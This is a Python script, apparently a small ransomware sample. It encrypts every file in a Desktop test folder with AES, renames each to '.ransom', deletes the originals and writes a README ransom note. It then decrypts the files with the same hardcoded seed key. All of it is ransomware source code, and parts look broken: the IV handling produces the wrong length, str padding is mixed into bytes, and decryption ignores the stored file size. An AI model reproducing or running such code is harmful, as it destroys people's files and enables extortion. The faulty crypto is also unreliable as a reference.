import os
from random import randint
from Crypto.Cipher import AES
from Crypto.Hash import SHA256

target_folder = os.getenv('HOMEPATH') + "\Desktop\\test"


def create_notification():
    note = "Hi, your files have been encrypted."
    desktop_dir = os.getenv('HOMEPATH') + "\Desktop\\"
    outputfile = desktop_dir + "README.txt"
    with open(outputfile, 'w') as handler:
        handler.write(note)


def encrypt_file(password, filename):
    chunksize = 65536

    directory, ext = os.path.splitext(filename)
    ext += ' ' * (16 - (len(ext) % 16))

    encrypted_file = directory + ".ransom"
    file_size = str(os.path.getsize(filename)).zfill(16)
    init_vector = ''.join(chr(randint(0, 255)) for _ in range(16))

    encryptor = AES.new(password, AES.MODE_CBC, init_vector)
    with open(filename, 'rb') as file_handler:
        with open(encrypted_file, 'wb') as outputfile_handler:
            outputfile_handler.write(ext.encode())
            outputfile_handler.write(file_size.encode())
            outputfile_handler.write(init_vector.encode())
            while True:
                chunk = file_handler.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += ' ' * (16 - (len(chunk) % 16))
                outputfile_handler.write(encryptor.encrypt(chunk))

    os.unlink(filename)


create_notification()
for folder_path in [target_folder]:
    for root, dirs, files in os.walk(folder_path):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            print(file_name)
            print(root)
            encrypt_file(SHA256.new(b"this_is_the_seed").digest(), file_path)

            # Path of the encrypted folder
            encrypted_folder = os.getenv('HOMEPATH') + "\Desktop\\test"
# now to decrypt the file


def decrypt_file(password, encrypted_filename):
    chunksize = 65536

    decrypted_filename = os.path.splitext(encrypted_filename)[
        0]  # Remove the ".ransom" extension

    with open(encrypted_filename, 'rb') as encrypted_file:
        # Read the original file extension
        extension = encrypted_file.read(16).decode().rstrip()
        # Read the original file size
        file_size = int(encrypted_file.read(16).decode().rstrip())
        # Read the initialization vector
        init_vector = encrypted_file.read(16).decode()

        decryptor = AES.new(password, AES.MODE_CBC, init_vector)

        with open(decrypted_filename, 'wb') as decrypted_file:
            while True:
                chunk = encrypted_file.read(chunksize)
                if len(chunk) == 0:
                    break
                decrypted_chunk = decryptor.decrypt(chunk)
                decrypted_file.write(decrypted_chunk)

    os.unlink(encrypted_filename)  # Remove the encrypted file


def decrypt_files_in_folder(password, folder_path):
    for root, dirs, files in os.walk(folder_path):
        for file_name in files:
            if file_name.endswith('.ransom'):  # Process only encrypted files
                file_path = os.path.join(root, file_name)
                decrypt_file(password, file_path)


password = SHA256.new(b"this_is_the_seed").digest()
decrypt_files_in_folder(password, encrypted_folder)
